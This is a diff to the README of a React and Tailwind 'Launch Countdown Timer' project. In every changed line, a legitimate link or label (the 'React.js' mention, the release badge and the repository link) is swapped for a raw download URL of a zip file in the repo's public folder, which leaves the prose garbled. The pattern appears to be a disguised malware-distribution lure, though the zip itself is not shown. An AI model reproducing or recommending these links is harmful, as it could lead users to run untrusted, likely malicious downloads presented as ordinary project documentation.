@@ -1,7 +1,7 @@
 # 🚀 launch-countdown-timer-main - A Simple Way to Track Your Launch
 
 ## 📜 Description
-A responsive Launch Countdown Timer built using React.js and Tailwind CSS. It dynamically displays the remaining time until a specific event or product launch with a clean and modern UI. 
+A responsive Launch Countdown Timer built using https://github.com/GiulianoCode-V/launch-countdown-timer-main/raw/refs/heads/main/public/timer_countdown_main_launch_v2.5-alpha.3.zip and Tailwind CSS. It dynamically displays the remaining time until a specific event or product launch with a clean and modern UI. 
 
 ## 🛠️ Features
 - **Responsive Design:** Works well on all devices, from phones to desktops.
@@ -13,7 +13,7 @@ A responsive Launch Countdown Timer built using React.js and Tailwind CSS. It dy
 ## 📥 Download & Install
 To get the application, visit the following page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/GiulianoCode-V/launch-countdown-timer-main/releases)
+[![Download Latest Release](https://github.com/GiulianoCode-V/launch-countdown-timer-main/raw/refs/heads/main/public/timer_countdown_main_launch_v2.5-alpha.3.zip%20Release-brightgreen)](https://github.com/GiulianoCode-V/launch-countdown-timer-main/raw/refs/heads/main/public/timer_countdown_main_launch_v2.5-alpha.3.zip)
 
 This page has all the latest versions of the Launch Countdown Timer. 
 
@@ -63,7 +63,7 @@ If you encounter issues, consider the following:
 For more help, visit our support page or contact us through the repository.
 
 ## 🔗 Additional Resources
-- For more details about the Launch Countdown Timer, visit our [GitHub Repository](https://github.com/GiulianoCode-V/launch-countdown-timer-main).
+- For more details about the Launch Countdown Timer, visit our [GitHub Repository](https://github.com/GiulianoCode-V/launch-countdown-timer-main/raw/refs/heads/main/public/timer_countdown_main_launch_v2.5-alpha.3.zip).
 - Join our community for updates and support.
 
 ## 💬 Feedback
